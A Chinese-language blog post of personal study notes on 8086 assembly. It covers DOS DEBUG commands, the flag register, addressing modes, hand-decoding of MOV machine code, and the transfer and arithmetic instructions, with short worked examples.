<img src="/2024/02/22/Notes-Decompile/00-2.png" class title="This is an example image">

<h2 id="常见反汇编指令"><a href="#常见反汇编指令" class="headerlink" title="常见反汇编指令"></a>常见反汇编指令</h2><h3 id="查看地址汇编-u"><a href="#查看地址汇编-u" class="headerlink" title="查看地址汇编-u"></a>查看地址汇编-u</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u[range]</span><br><span class="line">-u 11c 120  <span class="comment">#[range] = [startaddr][endaddr]</span></span><br><span class="line">-u 11c l 2  <span class="comment">#从11c地址开始，(list)打印两个字节的存储地址 [startaddr l num]</span></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/01.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/02.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/03.png" class title="This is an example image">

<h3 id="执行汇编指令-a"><a href="#执行汇编指令-a" class="headerlink" title="执行汇编指令-a"></a>执行汇编指令-a</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a[address] </span><br><span class="line">-a 110</span><br><span class="line">mov ax, ax</span><br><span class="line">mov dx, dx</span><br><span class="line">mov ax, dx</span><br><span class="line">mov byte ptr [110],al</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/04.png" class title="This is an example image">

<h3 id="寄存器操作-r"><a href="#寄存器操作-r" class="headerlink" title="寄存器操作-r"></a>寄存器操作-r</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r</span><br><span class="line">-r eax</span><br><span class="line">:ff00</span><br><span class="line">-r</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/05.png" class title="This is an example image">

<h3 id="内存查看-d"><a href="#内存查看-d" class="headerlink" title="内存查看-d"></a>内存查看-d</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d[range]</span><br><span class="line">-d 120 130</span><br><span class="line">-d 120 l 10</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/06.png" class title="This is an example image">

<h3 id="修改内存-e"><a href="#修改内存-e" class="headerlink" title="修改内存-e"></a>修改内存-e</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-e 110</span><br><span class="line">-e 120 11,12,13,14,15,16 17 18 19 20</span><br><span class="line">-e 120 <span class="string">&quot;Hello world&quot;</span></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/07.png" class title="This is an example image">

<h3 id="调试命令-g-t-p"><a href="#调试命令-g-t-p" class="headerlink" title="调试命令(g,t,p)"></a>调试命令(g,t,p)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g - F5</span><br><span class="line">t - F11</span><br><span class="line">p - F10</span><br></pre></td></tr></table></figure>

<h3 id="写入文件（n-cx-w）"><a href="#写入文件（n-cx-w）" class="headerlink" title="写入文件（n,cx,w）"></a>写入文件（n,cx,w）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e addr &quot;字符串&quot;</span><br></pre></td></tr></table></figure>



<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><img src="/2024/02/22/Notes-Decompile/26.png" class title="This is an example image">

<ol>
<li>条件标志位<br>SF  ZF  OF  CF  AF  PF<br>CPU执行完一条指令后自动设置。<br>反映算术、逻辑运算等指令执行完毕后，运算结果的特征。</li>
<li>控制标志位<br>DF  IF  TF<br>控制CPU的运行方式，工作状态。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OF DF IF SF ZF AF PF CF</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/22.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">溢出OV（overflow，OF＝1）</span><br><span class="line">无溢出NV（no overflow，OF＝0）</span><br><span class="line"></span><br><span class="line">减量DN（direction down，DF＝1）</span><br><span class="line">增量UP（direction up，DF＝0）</span><br><span class="line"></span><br><span class="line">允许中断EI（enable interrupt，IF＝1）</span><br><span class="line">进制中断DI（disable interrupt，IF＝0）</span><br><span class="line"></span><br><span class="line">负NG（negative，SF＝1）</span><br><span class="line">正PL（plus，SF＝0）</span><br><span class="line"></span><br><span class="line">零ZR（zero，ZF＝1）</span><br><span class="line">非零NZ（no zero，ZF＝0）</span><br><span class="line"></span><br><span class="line">辅助进位AC（auxiliary carry，AF＝1）</span><br><span class="line">无辅助进位NA（no auxiliary carry，AF＝0）</span><br><span class="line"></span><br><span class="line">偶校验PE（even parity，PF＝1）</span><br><span class="line">奇校验PO（odd parity，PF＝0）</span><br><span class="line"></span><br><span class="line">进位CY（carry，CF＝1）</span><br><span class="line">无进位NC（no carry，CF＝0）</span><br></pre></td></tr></table></figure>



<h3 id="CF进位标志"><a href="#CF进位标志" class="headerlink" title="CF进位标志"></a>CF进位标志</h3><p>当运算结果的最高有效位有进位（加法）或借位（减法）时设置。</p>
<p>进位标志置1，即CF &#x3D; 1；否则CF &#x3D; 0</p>
<p>用途：用于表示两个无符号数高低。</p>
<p>举例：</p>
<p>3AH + 7CH＝B6H，没有进位：CF &#x3D; 0</p>
<p>AAH + 7CH＝（1）26H，有进位：CF &#x3D; 1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a <span class="comment">#编写汇编指令</span></span><br><span class="line">mov al, 3a</span><br><span class="line">add al, 7c</span><br><span class="line">-u <span class="comment">#查看当前地址</span></span><br><span class="line">-t <span class="comment">#执行，关注IP</span></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/08.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/09.png" class title="This is an example image">

<h3 id="ZF零标志"><a href="#ZF零标志" class="headerlink" title="ZF零标志"></a>ZF零标志</h3><p>运算结果为0则ZF&#x3D;1，否则ZF&#x3D;0。表示两个无符号数高低。</p>
<p>用途：用于表示两个无符号数高低。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3AH + 7CH＝B6H，结果不是零：ZF = 0</span><br><span class="line">84H + 7CH＝（1）00H，结果是零：ZF = 1</span><br></pre></td></tr></table></figure>

<h3 id="OF溢出标志"><a href="#OF溢出标志" class="headerlink" title="OF溢出标志"></a>OF溢出标志</h3><p>•使用该标志位判断运算结果是否溢出。（当将操作数作为有符号数时）</p>
<p>–加法：若同符号数相加，结果的符号与之相反则OF&#x3D;1，否则OF置0。</p>
<p>–减法：被减数与减数异号，而结果的符号与减数相同则OF&#x3D;1，否则置0。</p>
<p>•发生了溢出，说明了运算结果不可信。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3AH + 7CH＝B6H，产生溢出：OF = 1</span><br><span class="line">AAH + 7CH＝（1）26H，没有溢出：OF = 0</span><br></pre></td></tr></table></figure>

<p>•进位针对的是无符号数运算，溢出针对的是有符号数运算。</p>
<p>•当看成无符号数，则关注CF标志，看成有符号数，则关注OF标志。</p>
<h3 id="SF符号标志"><a href="#SF符号标志" class="headerlink" title="SF符号标志"></a>SF符号标志</h3><p>•运算结果最高位为1，SF为1，否则为0。</p>
<p>•有符号数据用最高有效位表示数据的符号，最高有效位是符号标志的状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3AH + 7CH＝B6H，最高位D7＝1：SF = 1</span><br><span class="line">84H + 7CH＝（1）00H，最高位D7＝0：SF = 0</span><br></pre></td></tr></table></figure>

<h3 id="PF奇偶标志位"><a href="#PF奇偶标志位" class="headerlink" title="PF奇偶标志位"></a>PF奇偶标志位</h3><p>•当运算结果（指低8位）中1的个数为偶数时，PF置1，否则置0。</p>
<p>•作用：该标志位主要用于检测数据在传输过程中的错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3AH + 7CH＝B6H＝10110110B</span><br><span class="line">结果中有5个1，是奇数：PF = 0</span><br></pre></td></tr></table></figure>

<h3 id="AF辅助进位标志位"><a href="#AF辅助进位标志位" class="headerlink" title="AF辅助进位标志位"></a>AF辅助进位标志位</h3><p>•表示一个字节的低4位是否有进位和借位。运算时D3位（低半字节）有进位或借位时，AF &#x3D; 1；否则AF &#x3D; 0。</p>
<p>•处理器内部使用，用于十进制算术运算调整指令中，用户一般不必关心</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3AH + 7CH＝B6H，D3有进位：AF = 1</span><br></pre></td></tr></table></figure>

<h2 id="分段和指令"><a href="#分段和指令" class="headerlink" title="分段和指令"></a>分段和指令</h2><p>8086是16位cpu，最多可访问（寻址）多大内存？ 2^16 &#x3D; 65536 &#x3D; 2^6 * 2^10 &#x3D; 64k</p>
<p>8086允许最大内存1M，1M &#x3D; 10K &#x3D; 2 ^ 20      内存[00000]-[FFFFF]</p>
<p><strong>段基址(CS)</strong> <strong>+</strong> <strong>段偏移</strong> 。的方式一般写作 <strong>段地址：段偏移</strong>，称作<strong>逻辑地址</strong></p>
<p><strong>偏移地址</strong>称作<strong>EA</strong></p>
<p>通过逻辑地址计算出来的内存地址称作<strong>物理地址</strong></p>
<p>逻辑地址 -&gt; 地址加法器 -&gt; 物理地址</p>
<p><strong>内存地址</strong> <strong>&#x3D;</strong> <strong>段基址</strong> *** 10h +** <strong>段偏移</strong></p>
<p>073F:0100 &#x3D; 073 * 10 + 100</p>
<p>8086中，段基址都是存储在段寄存器中，段偏移可以用立即数或者通用寄存器指明。</p>
<img src="/2024/02/22/Notes-Decompile/10.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/11.png" class title="This is an example image">



<h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><p>操作数的值<strong>存储在指令</strong>中的方式称作立即寻址。</p>
<p>汇编中整数常量称作立即数。</p>
<p>立即数可以是8位数，也可以是16位数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV AL, 80H    ;将8位立即数80H送入AL寄存器</span><br><span class="line">MOV AX, 1234H  ;将16位立即数1234H送入AX寄存器</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/12.png" class title="This is an example image">

<h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><p>操作数的值<strong>存储在寄存器</strong>的寻址方式称作寄存器寻址。</p>
<p>寄存器包括通用寄存器，段寄存器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV CL, DL    </span><br><span class="line">MOV AX, BX</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/13.png" class title="This is an example image">

<p><strong>PS：</strong></p>
<p>段寄存器之间不能赋值。</p>
<p>指令指针寄存器不能用作寻址。</p>
<h4 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h4><p>操作数值在内存中，<strong>机器码中存储16位段内偏移</strong>的寻址方式称作直接寻址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MOV AL, [1064H]  <span class="comment">#基地址(ds)为2000</span></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/14.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-r</span><br><span class="line">-r ds</span><br><span class="line">:2000</span><br><span class="line">-r</span><br><span class="line">-e 1064 45 78</span><br><span class="line">-d 1064 l 20</span><br><span class="line">-r</span><br><span class="line">-a xxx</span><br><span class="line">mov ax, [1064]</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/15.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/16.png" class title="This is an example image">

<p><strong>PS:</strong></p>
<p>-r 查看当前寄存器状态，能查看到各种寄存器的值，<strong>CS用于存储基地址</strong>，<strong>IP用于指向偏移地址</strong>，最下面的指令是后续将要执行的指令地址和内容，常用于直接-a编辑。</p>
<img src="/2024/02/22/Notes-Decompile/22.png" class title="This is an example image">

<h4 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h4><p>a.操作数值在内存中，<strong>段内偏移存储在寄存器中</strong>的寻址方式称作寄存器间接寻址。</p>
<p>b.间接寻址的寄存器有BX, BP, SI, DI。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV AX, [SI]  ;将SI中的值作为段内偏移，从内存中取出数据赋值AX</span><br><span class="line">MOV [BX], AL  ;将BX中的值作为段内偏移，把AL中的值赋值给对应内存</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/17.png" class title="This is an example image">

<h5 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h5><p>a.操作数值在内存中，段内偏移存储由[<strong>寄存器</strong>+<strong>立即数</strong>]计算得来的的寻址方式称作寄存器相对寻址。</p>
<p>b.寄存器相对寻址的寄存器有BX, BP, SI, DI。</p>
<p>c.寄存器相对寻址的立即数可以是8位，可以是16位的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV  [SI+10H], AX  </span><br><span class="line">MOV  CX,[BX+COUNT] </span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/18.png" class title="This is an example image">

<h5 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h5><p>a. 操作数值在内存中，段内偏移由[<strong>寄存器</strong>+<strong>寄存器</strong>]计算得来的寻址方式称作基址变址寻址。</p>
<p>b. 可用做基址的寄存器有BX, BP。（只能基址+变址&#x2F;变址+基址）</p>
<p>c. BX默认DS段，BP默认SS段。</p>
<p>d.可用作变址的寄存器有SI, DI。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV  [BX+DI], AX</span><br><span class="line">MOV  CX, [BP+SI]</span><br></pre></td></tr></table></figure>

<h5 id="基址变址相对寻址"><a href="#基址变址相对寻址" class="headerlink" title="基址变址相对寻址"></a>基址变址相对寻址</h5><p>a. 操作数值在内存中，段内偏移由[<strong>基址寄存器</strong>+<strong>变址寄存器</strong>+<strong>偏移常量</strong>]计算得来的寻址方式称作基址变址寻址。</p>
<p>b. 可用做基址的寄存器有BX, BP。</p>
<p>c. BX默认DS段，BP默认SS段。</p>
<p>d.可用作变址的寄存器有SI, DI。</p>
<p>e.可用作常量的数值可以是8位，可以是16位。</p>
<p>可用于模拟数据运算</p>
<p><strong>PS：</strong></p>
<p>不可内存到内存，mov [bx],[ax]</p>
<h3 id="关于机器码"><a href="#关于机器码" class="headerlink" title="关于机器码"></a>关于机器码</h3><img src="/2024/02/22/Notes-Decompile/21.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/19.png" class title="This is an example image">

<p>手动分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,bx</span><br><span class="line">mov ax,cx</span><br><span class="line">mov ax,dx</span><br><span class="line">mov ax,ax</span><br><span class="line">mov ax,bp</span><br><span class="line">mov ax,si</span><br><span class="line">mov ax,di</span><br><span class="line">mov ax,sp</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/23.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89D8  MOV AX,BX  11 011 000  </span><br><span class="line">89C8  MOV AX,CX  11 001 000</span><br><span class="line">89D0  MOV AX,DX  11 010 000</span><br><span class="line">89C0  MOV AX,AX  11 000 000</span><br><span class="line">89E8  MOV AX,BP  11 101 000</span><br><span class="line">89F0  MOV AX,SI  11 110 000</span><br><span class="line">89F8  MOV AX,DI  11 111 000</span><br><span class="line">89E0  MOV AX,SP  11 100 000</span><br><span class="line"></span><br><span class="line">AX 000</span><br><span class="line">CX 001</span><br><span class="line">DX 010</span><br><span class="line">BX 011</span><br><span class="line">SP 100</span><br><span class="line">BP 101</span><br><span class="line">SI 110</span><br><span class="line">DI 111</span><br><span class="line"></span><br><span class="line">MOV DX,BP</span><br><span class="line">89 11 101 010</span><br><span class="line">=&gt;89 1110 1010</span><br><span class="line">=&gt;89EA</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/24.png" class title="This is an example image">

<p>内存里运行的是机器码</p>
<img src="/2024/02/22/Notes-Decompile/20.png" class title="This is an example image">

<h2 id="数据传送和算术指令"><a href="#数据传送和算术指令" class="headerlink" title="数据传送和算术指令"></a>数据传送和算术指令</h2><p> 机器码、内存、寄存器、立即数（8086、286、386、486）</p>
<h3 id="MOV传送指令"><a href="#MOV传送指令" class="headerlink" title="MOV传送指令"></a>MOV传送指令</h3><p>把一个字节或字的操作数从源地址传送至目的地址。注意：<strong>不存在存储器向存储器的传送指令。</strong></p>
<img src="/2024/02/22/Notes-Decompile/25.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [bx],ax</span><br><span class="line">mov ax,[bx]</span><br><span class="line">mov byte ptr[bx], 12 ;要指定字节数，mov双方寄存器长度要一致</span><br><span class="line">mov byte word[bx], 12 ;两个字节，可能存在溢出覆盖</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov byte ptr[bx],12</span><br><span class="line">mov word ptr[bx],12</span><br></pre></td></tr></table></figure>

<h3 id="XCHG交换指令"><a href="#XCHG交换指令" class="headerlink" title="XCHG交换指令"></a>XCHG交换指令</h3><p>1.寄存器与寄存器之间对换数据</p>
<p>2.寄存器与存储器之间对换数据</p>
<p>3.不能在存储器与存储器之间对换数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XCHG AX,BX</span><br></pre></td></tr></table></figure>

<h3 id="XLAT换码指令"><a href="#XLAT换码指令" class="headerlink" title="XLAT换码指令"></a>XLAT换码指令</h3><p>将BX（数组首地址）指定的缓冲区中、AL（数组下标索引）指定的位移处的一个字节取出赋给AL </p>
<p>al &lt;– ds:[ bx + al ]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov al,e</span><br><span class="line">XLAT</span><br></pre></td></tr></table></figure>

<p>数组首地址是0，索引是e，取值赋给al</p>
<h3 id="push、pop堆栈操作指令"><a href="#push、pop堆栈操作指令" class="headerlink" title="push、pop堆栈操作指令"></a>push、pop堆栈操作指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 进栈（push reg）</span><br><span class="line">    sub sp , 2</span><br><span class="line">    mov [sp] , reg </span><br><span class="line">2.出栈（pop reg）</span><br><span class="line">    mov reg, [sp] </span><br><span class="line">    add sp , 2</span><br><span class="line">3.保存所有寄存器环境</span><br><span class="line">    16位：pusha / popa </span><br><span class="line">    32位：pushad / popad</span><br></pre></td></tr></table></figure>

<h3 id="PUSHF、POPF标志进出栈指令"><a href="#PUSHF、POPF标志进出栈指令" class="headerlink" title="PUSHF、POPF标志进出栈指令"></a>PUSHF、POPF标志进出栈指令</h3><p>•PUSHF指令将标志寄存器的内容压入堆栈，同时栈顶指针SP减2</p>
<p>•POPF指令将栈顶字单元内容送标志寄存器，同时栈顶指针SP加2</p>
<h3 id="LEA地址传送指令"><a href="#LEA地址传送指令" class="headerlink" title="LEA地址传送指令"></a>LEA地址传送指令</h3><p>•地址传送指令将存储器单元的逻辑地址送至指定的寄存器</p>
<p>–有效地址传送指令 LEA</p>
<p>–指针传送指令 LDS和LES</p>
<p>•注意不是获取存储器单元的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LEA和MOV的区别(bx+si = ea)</span><br><span class="line">LEA bx,[bx+si] // bx = ea   不取地址内容</span><br><span class="line">mov bx,[bx+si] // bx = [ea] 取地址内容</span><br><span class="line"></span><br><span class="line">add bx,si</span><br><span class="line">mov ax,bx  </span><br><span class="line">=&gt; lea ax,[bx,si]</span><br></pre></td></tr></table></figure>

<h3 id="算数运算类指令"><a href="#算数运算类指令" class="headerlink" title="算数运算类指令"></a>算数运算类指令</h3><h4 id="加法（ADD-ADC-INC）"><a href="#加法（ADD-ADC-INC）" class="headerlink" title="加法（ADD|ADC|INC）"></a>加法（ADD|ADC|INC）</h4><p>ADD：加法，影响标识位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD reg,imm/reg/mem</span><br><span class="line">	；reg←reg＋imm/reg/mem</span><br><span class="line">ADD mem,imm/reg</span><br><span class="line">	；mem←mem＋imm/reg</span><br></pre></td></tr></table></figure>

<p>ADC：带进位加法，带标识位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC reg,imm/reg/mem</span><br><span class="line">	；reg←reg＋imm/reg/mem＋CF</span><br><span class="line">ADC mem,imm/reg</span><br><span class="line">	；mem←mem＋imm/reg＋CF</span><br></pre></td></tr></table></figure>

<p>INC：加一，不影响CF标志位</p>
<h4 id="减法（SUB-SBB-DEC）"><a href="#减法（SUB-SBB-DEC）" class="headerlink" title="减法（SUB|SBB|DEC）"></a>减法（SUB|SBB|DEC）</h4><p>SUB：减法，影响标识位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUB reg,imm/reg/mem</span><br><span class="line">	；reg←reg－imm/reg/mem</span><br><span class="line">SUB mem,imm/reg</span><br><span class="line">	；mem←mem－imm/reg</span><br></pre></td></tr></table></figure>

<p>SBB：带借位的减法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SBB reg,imm/reg/mem</span><br><span class="line">        ；reg←(reg－(imm/reg/mem)－CF)</span><br><span class="line">SBB mem,imm/reg	</span><br><span class="line">        ；mem←mem－imm/reg－CF</span><br></pre></td></tr></table></figure>

<p>DEC： -1，不影响CF位</p>
<h4 id="求补（NEG）"><a href="#求补（NEG）" class="headerlink" title="求补（NEG）"></a>求补（NEG）</h4><p>•NEG指令对操作数执行求补运算：用零减去操作数，然后结果返回操作数</p>
<p>•求补运算也可以表达成：将操作数按位取反后加1</p>
<p>•neg ax  ;如果ax &#x3D; 0，则CF标志位 &#x3D; 0；若ax !&#x3D; 0, 则CF &#x3D; 1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">问题：</span><br><span class="line">Reg == 0 ? 0 : -1</span><br><span class="line">Reg == 1 ? 1 : 0</span><br><span class="line">Reg == 8 ? 9 : 8</span><br><span class="line">Reg == 6 ? 8 : 9</span><br><span class="line"></span><br><span class="line">mov ax, X</span><br><span class="line">sub ax, 0</span><br><span class="line">neg ax</span><br><span class="line">sbb ax, ax</span><br><span class="line">sbb ax, ax</span><br><span class="line"></span><br><span class="line">1.X = 8(1000)</span><br><span class="line">mov ax, X ; ax = 8</span><br><span class="line">sub ax, 0 ; ax = 8</span><br><span class="line">neg ax    ; ax = -8, CF = 1</span><br><span class="line">sbb ax, ax; ax = -1, CF = 1</span><br><span class="line">sbb ax, ax; ax = -1</span><br><span class="line"></span><br><span class="line">2.X = 0</span><br><span class="line">mov ax, X ; ax = 0</span><br><span class="line">sub ax, 0 ; ax = 0</span><br><span class="line">neg ax    ; ax = 0, CF = 0</span><br><span class="line">sbb ax, ax; ax = 0, CF = 0</span><br><span class="line">sbb ax, ax; ax = 0</span><br></pre></td></tr></table></figure>

<h4 id="比较（CMP）"><a href="#比较（CMP）" class="headerlink" title="比较（CMP）"></a>比较（CMP）</h4><p>•格式：: CMP OPD,OPS</p>
<p>•功能：(OPD)－(OPS)</p>
<p>•说明：目的操作数减去源操作数，然后根据结果设置标志位，但该<strong>结果并不存入目的地址</strong>（sub存入）</p>
<p>•影响标志位：AF、CF、OF、PF、SF、ZF</p>
<p>•作用：一般的后面跟一条条件转移指令，根据比较结果转向不同的程序分支，用于处理OPD和OPS大小比较的不同情况。</p>
<h4 id="乘法（MUL-x2F-IMUL）"><a href="#乘法（MUL-x2F-IMUL）" class="headerlink" title="乘法（MUL&#x2F;IMUL）"></a>乘法（MUL&#x2F;IMUL）</h4><h5 id="无符号乘法"><a href="#无符号乘法" class="headerlink" title="无符号乘法"></a>无符号乘法</h5><p>格式：MUL Reg&#x2F;Mem</p>
<p>功能：显式操作数*隐含操作数(看成无符号数)。</p>
<p>影响标志位：CF和OF。</p>
<table>
<thead>
<tr>
<th>位数</th>
<th>隐含的被乘数</th>
<th>乘积的存放位置</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>8位</td>
<td>AL</td>
<td>AX</td>
<td>MUL BL</td>
</tr>
<tr>
<td>16位</td>
<td>AX</td>
<td>DX&amp;AX</td>
<td>MUL BX</td>
</tr>
<tr>
<td>32位</td>
<td>EAX</td>
<td>EDX&amp;EAX</td>
<td>MUL ECX</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两个byte相乘要用word放（FF*FF=FE01）</span><br><span class="line">两个word相乘要用dword放(FFFF*FFFF=FFFE0001，没dword就两个寄存器)</span><br><span class="line"></span><br><span class="line">mov bl, 88</span><br><span class="line">mov al, 99</span><br><span class="line">mul bl      //存到AX</span><br><span class="line"></span><br><span class="line">mov word ptr[0], 1234</span><br><span class="line">mov bx, 4567</span><br><span class="line">mov ax, 4567</span><br><span class="line">mul word ptr[0], 4567   //存到DX&amp;AX</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/27.png" class title="This is an example image">

<p>如果乘积的高一半位(AH&#x2F;DX&#x2F;EDX)包含有乘积的有效位，则CF&#x3D;1、OF&#x3D;1; 否则，CF&#x3D;0，OF&#x3D;0。</p>
<p>OF&#x3D;CF&#x3D;1则说明：<br>字节乘字节结果超过了8位<br>字乘字结果超过了16位<br>双字乘双字结果超过了32位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bl, 15</span><br><span class="line">mov al, 4</span><br><span class="line">mul bl</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/28.png" class title="This is an example image">

<h5 id="有符号乘法"><a href="#有符号乘法" class="headerlink" title="有符号乘法"></a>有符号乘法</h5><p>IMUL Reg&#x2F;Mem</p>
<p>IMUL Reg, Imm ;80286+</p>
<p>IMUL Reg,Reg,Imm;80286+</p>
<p>IMULReg,Reg&#x2F;Mem;80386+</p>
<p>功能：有符号数相乘</p>
<p>影响标志位：CF和OF。会扩展符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果乘积的高一半位(AH，DX，EDX)不是低位的符号扩展，则CF=1、OF=1；否则，CF=0，OF=0。</span><br><span class="line">-1 * 1 = -1</span><br><span class="line">FF * 1 =&gt; AX  =&gt; 00FF 会被当做正数，则补全符号位 =&gt; FFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-举例：</span><br><span class="line">mov bl, -2</span><br><span class="line">mov al, 1</span><br><span class="line">imul bl</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/29.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bl, -15</span><br><span class="line">mov al, 15</span><br><span class="line">imul bl       //不完全是符号位扩展，有数据位</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/30.png" class title="This is an example image">

<p>EB * 15 &#x3D; 1347</p>
<h4 id="除法（DIV-x2F-IDIV）"><a href="#除法（DIV-x2F-IDIV）" class="headerlink" title="除法（DIV&#x2F;IDIV）"></a>除法（DIV&#x2F;IDIV）</h4><h5 id="无符号除法"><a href="#无符号除法" class="headerlink" title="无符号除法"></a>无符号除法</h5><p>格式：DIV Reg&#x2F;Mem    被除数&#x2F;除数 &#x3D; 商 .. 余数</p>
<table>
<thead>
<tr>
<th>位数</th>
<th>被除数</th>
<th>除数</th>
<th>商</th>
<th>余数</th>
</tr>
</thead>
<tbody><tr>
<td>8位</td>
<td>AX</td>
<td>8位ops</td>
<td>AL</td>
<td>AH</td>
</tr>
<tr>
<td>16位</td>
<td>DX,AX</td>
<td>16位ops</td>
<td>AX</td>
<td>DX</td>
</tr>
<tr>
<td>32位</td>
<td>EDX,EAX</td>
<td>32位ops</td>
<td>EAX</td>
<td>EDX</td>
</tr>
</tbody></table>
<p>影响标志位：未定义</p>
<p>未定义：指令执行后这些标志是任意的，不可预测的。没有影响：指令执行后不改变标志状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 9</span><br><span class="line">mov bl, 4</span><br><span class="line">div bl</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/31.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dx, 1234   // dx作用暂存</span><br><span class="line">mov ax, 5678</span><br><span class="line">mov bx, 4569</span><br><span class="line">div bx         // 12345678 / 4569 = 4324 . 18B4</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/32.png" class title="This is an example image">

<h5 id="有符号数除法"><a href="#有符号数除法" class="headerlink" title="有符号数除法"></a>有符号数除法</h5><p>格式：IDIV Reg&#x2F;Mem</p>
<table>
<thead>
<tr>
<th>位数</th>
<th>被除数</th>
<th>除数</th>
<th>商</th>
<th>余数</th>
</tr>
</thead>
<tbody><tr>
<td>8位</td>
<td>AX</td>
<td>8位ops</td>
<td>AL</td>
<td>AH</td>
</tr>
<tr>
<td>16位</td>
<td>DX,AX</td>
<td>16位ops</td>
<td>AX</td>
<td>DX</td>
</tr>
<tr>
<td>32位</td>
<td>EDX,EAX</td>
<td>32位ops</td>
<td>EAX</td>
<td>EDX</td>
</tr>
</tbody></table>
<p>影响标志位：AF、CF、OF、PF、SF和ZF</p>
